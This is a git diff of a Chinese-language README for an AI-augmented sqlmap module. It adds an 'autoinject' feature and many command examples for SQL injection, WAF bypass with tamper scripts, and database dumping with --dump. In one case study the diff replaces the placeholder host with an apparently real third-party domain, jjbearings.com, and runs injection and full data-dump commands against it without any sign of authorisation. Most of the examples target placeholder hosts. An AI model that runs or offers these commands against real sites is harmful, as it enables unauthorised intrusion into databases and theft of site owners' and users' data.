@@ -10,6 +10,7 @@ SQLMap AI模块是对SQLMap工具的增强，通过集成大型语言模型(LLM)
 4. **修复建议**：提供针对性的安全修复方案
 5. **交互式CLI**：提供友好的命令行交互界面
 6. **自动注入**：AI扫描后自动执行注入攻击并分析结果
+7. **简化版自动注入**：优化的自动注入功能，提高稳定性和成功率
 
 ## 安装与配置
 
@@ -123,6 +124,18 @@ openai_auth_prefix = Bearer
    python sqlmap.py -l burp.log --smart-payload --ai-analysis
    ```
 
+5. **简化版自动注入** *(新功能)*
+   ```bash
+   # 基本用法
+   python -m ai_module autoinject "http://example.com/vuln.php?id=1"
+   
+   # 指定数据库类型
+   python -m ai_module autoinject "http://example.com/vuln.php?id=1" --dbms mysql
+   
+   # 提取数据
+   python -m ai_module autoinject "http://example.com/vuln.php?id=1" --dump
+   ```
+
 ### AI CLI模式详解
 
 在AI CLI模式下（通过 `--ai-cli` 启动），提供以下详细命令：
@@ -178,14 +191,15 @@ openai_auth_prefix = Bearer
    autoinject <目标URL> [选项]
    
    # 选项
+   --dbms <类型>     指定数据库类型（mysql, postgresql等）
    --dump           提取数据
-   --tables <表名>  指定要提取的表
+   --tables <表名>   指定要提取的表
    --verbose        详细输出
-   --timeout <秒>   设置超时时间
+   --timeout <秒>    设置超时时间
    
    # 示例
    sqlmap-ai> autoinject http://example.com/vulnerable.php?id=1
-   sqlmap-ai> autoinject http://example.com/page.php?id=1 --dump
+   sqlmap-ai> autoinject http://example.com/page.php?id=1 --dbms mysql --dump
    sqlmap-ai> autoinject http://example.com/api.php?id=1 --dump --tables users
    sqlmap-ai> autoinject http://example.com/search.php?q=1 --verbose --timeout 60
    ```
@@ -228,8 +242,8 @@ openai_auth_prefix = Bearer
    # 定时任务
    python sqlmap.py -u "http://example.com" --smart-payload --ai-analysis --output-dir="daily_scan"
    
-   # 自动注入
-   python -m ai_module autoinject "http://example.com/vuln.php?id=1" --dump
+   # 自动注入（新简化版）
+   python -m ai_module autoinject "http://example.com/vuln.php?id=1" --dbms mysql --dump
    ```
 
 4. **结果导出**
@@ -274,6 +288,11 @@ export SQLMAP_AI_TIMEOUT=60
    - 自定义提示词模板
    - 配置代理服务器
 
+4. **自动注入优化** *(新增)*
+   - 使用简化版自动注入提高成功率
+   - 明确指定数据库类型加快扫描速度
+   - 优先使用常见参数名（如id, user_id等）
+
 ## 故障排除
 
 **Q: API调用失败怎么办？**
@@ -310,6 +329,26 @@ python -m ai_module cache --clear
 python -m ai_module cache --rebuild
 ```
 
+**Q: 自动注入失败？** *(新增)*
+
+A: 可能的原因：
+- URL格式不正确
+- 目标网站无漏洞或有WAF保护
+- 参数名称不匹配
+- 数据库类型指定错误
+
+解决方法：
+```bash
+# 尝试指定正确的数据库类型
+python -m ai_module autoinject "http://example.com/page.php?id=1" --dbms mysql
+
+# 使用更基本的命令减少复杂性
+python -m ai_module autoinject "http://example.com/page.php?id=1" --batch
+
+# 查看详细输出进行调试
+python -m ai_module autoinject "http://example.com/page.php?id=1" --verbose
+```
+
 **Q: 如何在没有网络的环境中使用？**
 
 A: AI模块默认需要网络连接以访问API服务，但您可以：
@@ -324,13 +363,16 @@ A: AI模块默认需要网络连接以访问API服务，但您可以：
 
 ```bash
 # 步骤1：初始扫描
-python sqlmap.py -u "http://target.com/page.php?id=1" --dbms=mysql --ai-analysis
+python sqlmap.py -u "http://jjbearings.com/userabout.php?id=1" --dbms=mysql --ai-analysis
 
 # 步骤2：使用智能payload
-python sqlmap.py -u "http://target.com/page.php?id=1" --dbms=mysql --smart-payload --technique=U
+python sqlmap.py -u "http://jjbearings.com/userabout.php?id=1" --dbms=mysql --smart-payload --technique=U
 
 # 步骤3：获取详细解释并建议修复方案
-python sqlmap.py -u "http://target.com/page.php?id=1" --dbms=mysql --ai-analysis --explain-vuln --suggest-fix
+python sqlmap.py -u "http://jjbearings.com/userabout.php?id=1" --dbms=mysql --ai-analysis --explain-vuln --suggest-fix
+
+# 步骤4：使用简化版自动注入功能 (新增)
+python -m ai_module autoinject "http://jjbearings.com/userabout.php?id=1" --dbms mysql --dump
 ```
 
 ### 案例2：绕过WAF保护的网站
@@ -346,6 +388,9 @@ python sqlmap.py -u "http://target.com/page.php?id=1" --smart-payload --tamper=s
 
 # 步骤3：分析结果
 python sqlmap.py -u "http://target.com/page.php?id=1" --smart-payload --tamper=space2comment,charencode --ai-analysis
+
+# 步骤4：使用简化版自动注入 (新增)
+python -m ai_module autoinject "http://target.com/page.php?id=1" --dbms mysql --batch
 ```
 
 ### 案例3：REST API测试
@@ -361,6 +406,10 @@ python sqlmap.py -r req.txt --smart-payload --data='{"userId": "*"}'
 
 # 步骤3：分析结果并获取修复建议
 python sqlmap.py -r req.txt --ai-analysis --explain-vuln --suggest-fix
+
+# 步骤4：使用简化版自动注入 (新增)
+# (需要先从请求文件中提取URL和参数)
+python -m ai_module autoinject "https://api.example.com/users?id=1" --dbms postgresql
 ```
 
 ### 案例4：大规模渗透测试
@@ -376,15 +425,22 @@ python sqlmap.py -m targets.txt --smart-payload --batch --threads=5
 
 # 步骤3：生成综合报告
 python sqlmap.py -m targets.txt --ai-analysis --report-format=pdf --output-dir=scan_results
+
+# 步骤4：对发现的漏洞进行自动注入 (新增)
+# (针对发现的漏洞URL逐个进行自动注入)
+python -m ai_module autoinject "http://vulnerable-target.com/page.php?id=1" --dump
 ```
 
-### 案例5：自动注入测试
+### 案例5：自动注入测试 (更新)
 
-完全自动化的SQL注入测试流程：
+完全自动化的SQL注入测试流程，使用新的简化版自动注入功能：
 
 ```bash
 # 基本自动注入
 python -m ai_module autoinject "http://target.com/page.php?id=1"
+
+# 指定数据库类型
+python -m ai_module autoinject "http://target.com/page.php?id=1" --dbms mysql
 
 # 自动注入并提取数据
 python -m ai_module autoinject "http://target.com/page.php?id=1" --dump
@@ -394,7 +450,7 @@ python -m ai_module autoinject "http://target.com/page.php?id=1" --dump --tables
 
 # 交互式方式
 python -m ai_module cli
-sqlmap-ai> autoinject http://target.com/page.php?id=1 --dump
+sqlmap-ai> autoinject http://target.com/page.php?id=1 --dbms mysql --dump
 ```
 
 ## 自定义与扩展
@@ -472,6 +528,12 @@ language = zh_CN
 - 添加AI扫描后自动注入功能
 - 增强注入结果分析能力
 - 优化交互式CLI界面
+
+### v1.4.0 (最新版本)
+- 添加简化版自动注入功能，提高稳定性
+- 修复参数处理问题
+- 优化错误处理和调试信息
+- 添加更多使用案例和故障排除指南
 
 ## 贡献与反馈
 
